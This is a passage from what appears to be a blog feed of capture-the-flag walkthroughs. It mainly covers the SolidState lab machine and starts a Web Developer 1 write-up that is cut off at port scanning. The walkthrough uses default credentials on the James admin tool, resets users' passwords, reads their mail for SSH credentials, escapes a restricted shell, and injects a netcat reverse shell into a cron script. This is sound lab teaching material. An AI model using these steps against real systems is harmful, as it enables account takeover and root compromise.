http://192.168.179.185/services.html        &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 8404]                                    
http://192.168.179.185/assets               &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 319] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://192.168.179.185/assets/]
http://192.168.179.185/README.txt           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 963]                                     
http://192.168.179.185/LICENSE.txt          &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 17128]                                   
http://192.168.179.185/server-status        &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 303]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;enumeration-on-port-4555&quot;&gt;Enumeration on port 4555&lt;/h3&gt;

&lt;p&gt;By connecting on port 4545, we see that it service requires authentication, but using root as username and password we have successfull access.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;telnet 192.168.179.185 4555
Trying 192.168.179.185...
Connected to 192.168.179.185.
Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;:
root
Password:
root
Welcome root. HELP &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;a list of commands
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Executing the &lt;strong&gt;help&lt;/strong&gt; command we can see the list of available commands to the root user.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;help
&lt;/span&gt;Currently implemented commands:
&lt;span class=&quot;nb&quot;&gt;help                                    &lt;/span&gt;display this &lt;span class=&quot;nb&quot;&gt;help
&lt;/span&gt;listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;username] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;password]           add a new user
verify &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;username]                       verify &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;specified user exist
deluser &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;username]                      delete existing user
setpassword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;username] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;password]       sets a user&lt;span class=&quot;s1&quot;&gt;'s password
setalias [user] [alias]                 locally forwards all email for '&lt;/span&gt;user&lt;span class=&quot;s1&quot;&gt;' to '&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;alias&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'
showalias [username]                    shows a user'&lt;/span&gt;s current email &lt;span class=&quot;nb&quot;&gt;alias
&lt;/span&gt;unsetalias &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;user]                       unsets an &lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'user'&lt;/span&gt;
setforwarding &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;username] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;emailaddress] forwards a user&lt;span class=&quot;s1&quot;&gt;'s email to another email address
showforwarding [username]               shows a user'&lt;/span&gt;s current email forwarding
unsetforwarding &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;username]              removes a forward
user &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;repositoryname]                   change to another user repository
shutdown                                kills the current JVM &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;convenient when James is run as a daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
quit                                    close connection
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We list the users by typing the &lt;strong&gt;listusers&lt;/strong&gt; command.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We create the user &lt;strong&gt;s4rgaz&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adduser s4rgaz 123
User s4rgaz added
listusers
Existing accounts 6
user: james
user: thomas
user: john
user: mindy
user: s4rgaz
user: mailadmin
quit
Bye
Connection closed by foreign host.
root@kali:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;enumeration-on-service-pop3&quot;&gt;Enumeration on service pop3&lt;/h3&gt;

&lt;p&gt;By logging in to pop3 service as user &lt;strong&gt;s4rgaz&lt;/strong&gt;, we have successful access, so we can manage the users to be able to access to pop3 service.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;telnet 192.168.179.185 110
Trying 192.168.179.185...
Connected to 192.168.179.185.
Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+OK solidstate POP3 server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;JAMES POP3 Server 2.3.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ready 
user s4rgaz
+OK
pass 123
+OK Welcome s4rgaz
list
+OK 0 0
&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
quit
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.
root@kali:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We go back to the service running on port 4545 and change john’s password.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;telnet 192.168.179.185 4555
Trying 192.168.179.185...
Connected to 192.168.179.185.
Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;:
root
Password:
root
Welcome root. HELP &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;a list of commands
setpassword john john
Password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;john reset
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We log in on pop3 service as user john, in the mail it indicates that access to &lt;strong&gt;mindy&lt;/strong&gt; is restricted.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;telnet 192.168.179.185 110
Trying 192.168.179.185...
Connected to 192.168.179.185.
Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+OK solidstate POP3 server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;JAMES POP3 Server 2.3.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ready 
user john
+OK
pass john
+OK Welcome john
list
+OK 1 743
1 743
&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
retr 1
+OK Message follows
Return-Path: &amp;lt;mailadmin@localhost&amp;gt;
Message-ID: &amp;lt;9564574.1.1503422198108.JavaMail.root@solidstate&amp;gt;
MIME-Version: 1.0
Content-Type: text/plain&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 &lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;192.168.11.142]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
          by solidstate &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;JAMES SMTP Server 2.3.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with SMTP ID 581
          &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &amp;lt;john@localhost&amp;gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          Tue, 22 Aug 2017 13:16:20 &lt;span class=&quot;nt&quot;&gt;-0400&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EDT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Date: Tue, 22 Aug 2017 13:16:20 &lt;span class=&quot;nt&quot;&gt;-0400&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EDT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy&lt;span class=&quot;s1&quot;&gt;'s access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then we change mindy’s password.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;telnet 192.168.179.185 4555
Trying 192.168.179.185...
Connected to 192.168.179.185.
Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;:
root
Password:
root
Welcome root. HELP &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;a list of commands
setpassword mindy mindy
Password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;mindy reset
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We login as user &lt;strong&gt;mindy&lt;/strong&gt; on pop3 service and see her SSH login credentials.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;telnet 192.168.179.185 110                                                                                                                  
Trying 192.168.179.185...                                                                                                                                           
Connected to 192.168.179.185.                                                                                                                                       
Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                                                                                                                           
+OK solidstate POP3 server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;JAMES POP3 Server 2.3.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ready                                                                                                          
user mindy                                                                                                                                                          
+OK                                                                                                                                                                 
pass mindy                                                                                                                                                          
+OK Welcome mindy                                                                                                                                                   
list                                                                                                                                                                
+OK 2 1945                                                                                                                                                          
1 1109                                                                                                                                                              
2 836                                                                                                                                                               
&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 
retr 2
+OK Message follows
Return-Path: &amp;lt;mailadmin@localhost&amp;gt;
Message-ID: &amp;lt;16744123.2.1503422270399.JavaMail.root@solidstate&amp;gt;
MIME-Version: 1.0
Content-Type: text/plain&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 &lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;192.168.11.142]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
          by solidstate &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;JAMES SMTP Server 2.3.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with SMTP ID 581
          &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &amp;lt;mindy@localhost&amp;gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          Tue, 22 Aug 2017 13:17:28 &lt;span class=&quot;nt&quot;&gt;-0400&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EDT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Date: Tue, 22 Aug 2017 13:17:28 &lt;span class=&quot;nt&quot;&gt;-0400&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EDT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
&lt;h3 id=&quot;access-via-ssh&quot;&gt;Access via SSH&lt;/h3&gt;

&lt;p&gt;We access to the server via SSH as user &lt;strong&gt;mindy&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; mindy 192.168.179.185 
mindy@192.168.179.185&lt;span class=&quot;s1&quot;&gt;'s password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We found the flag in her home directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mindy@solidstate:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;bin  user.txt
mindy@solidstate:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt 
914d0a4ebc1777889b5b89a23f556fd75
mindy@solidstate:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By trying to execute some system commands, we see that we are under a restricted shell.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mindy@solidstate:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;bin/
&lt;span class=&quot;nt&quot;&gt;-rbash&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt;: restricted
mindy@solidstate:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip addr
&lt;span class=&quot;nt&quot;&gt;-rbash&lt;/span&gt;: ip: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
mindy@solidstate:~
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To bypass the jailed shell, we type &lt;strong&gt;bash -i&lt;/strong&gt; to the SSH command.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; mindy 192.168.179.185 &lt;span class=&quot;s2&quot;&gt;&quot;bash -i&quot;&lt;/span&gt;                          
mindy@192.168.179.185&lt;span class=&quot;s1&quot;&gt;'s password: 
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we can run any system command, a python script was found in the &lt;strong&gt;/opt&lt;/strong&gt; directory, probably a cron job is running this file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 16
drwxr-xr-x  3 root root 4096 Aug 22  2017 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 22 root root 4096 Jun 18  2017 ..
drwxr-xr-x 11 root root 4096 Aug 22  2017 james-2.3.2
&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt;  1 root root  105 Aug 22  2017 tmp.py
&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;tmp.py
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;tmp.py
&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python&lt;/span&gt;
import os
import sys
try:
     os.system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'rm -r /tmp/* '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
except:
     sys.exit&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:/opt&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
&lt;h3 id=&quot;cron-job&quot;&gt;Cron Job&lt;/h3&gt;

&lt;p&gt;We add the following instruction to the end of the &lt;strong&gt;tmp.py&lt;/strong&gt; file, when the cron job executes the script, it will try to connect to my attacking machine, giving us a root shell.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;os.system('nc 192.168.179.1 1337 -e /bin/bash')&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; tmp.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We set up a netcat listener on port 1337, wait a moment and we have a root shell.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-vlnp&lt;/span&gt; 1337
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1337 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.1] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.185] 40466
script &lt;span class=&quot;nt&quot;&gt;-qc&lt;/span&gt; /bin/bash /dev/null
root@solidstate:~# &lt;span class=&quot;nb&quot;&gt;ls
ls
&lt;/span&gt;root.txt
root@solidstate:~# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt
b4c9723a28899b1c45db281d99cc87c9
root@solidstate:~#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>s4rgaz</name></author><summary type="html">Description: It was originally created for HackTheBox</summary></entry><entry><title type="html">VulnHub - Web Developer 1</title><link href="http://localhost:4000/webdeveloper1.html" rel="alternate" type="text/html" title="VulnHub - Web Developer 1" /><published>2022-01-02T00:00:00-05:00</published><updated>2022-01-02T00:00:00-05:00</updated><id>http://localhost:4000/webdeveloper1</id><content type="html" xml:base="http://localhost:4000/webdeveloper1.html">&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt; A machine specially designed to be vulnerable with certain changes to its previous version.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; Fred Wemeijer&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Operating System:&lt;/strong&gt; Linux&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Aim:&lt;/strong&gt; To get root shell and read the flag.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/web-developer-1,288/&quot;&gt;https://www.vulnhub.com/entry/web-developer-1,288/&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h2&gt;
&lt;h3 id=&quot;host-discovery&quot;&gt;Host Discovery&lt;/h3&gt;

&lt;p&gt;We start discovering our target in the local network with netdiscover.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;netdiscover &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; vmnet1 &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 192.168.179.0/24  
 Currently scanning: Finished!   |   Screen View: Unique Hosts      
                                                                   
 6 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 342      
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 &lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------&lt;/span&gt;
 192.168.179.184 00:0c:29:fc:85:b7      5     300  VMware, Inc.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h3&gt;

&lt;p&gt;We proceed to perform a full TCP por scan with nmap.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p1-65535&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 192.168.179.184 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; nmap/all-tcp-ports.txt
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h3&gt;

&lt;p&gt;We do a service enumeration and script scanning on discovered open ports.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 192.168.179.184 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 d2:ac:73:4c:17:ec:6a:82:79:87:5a:f9:22:d4:12:cb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
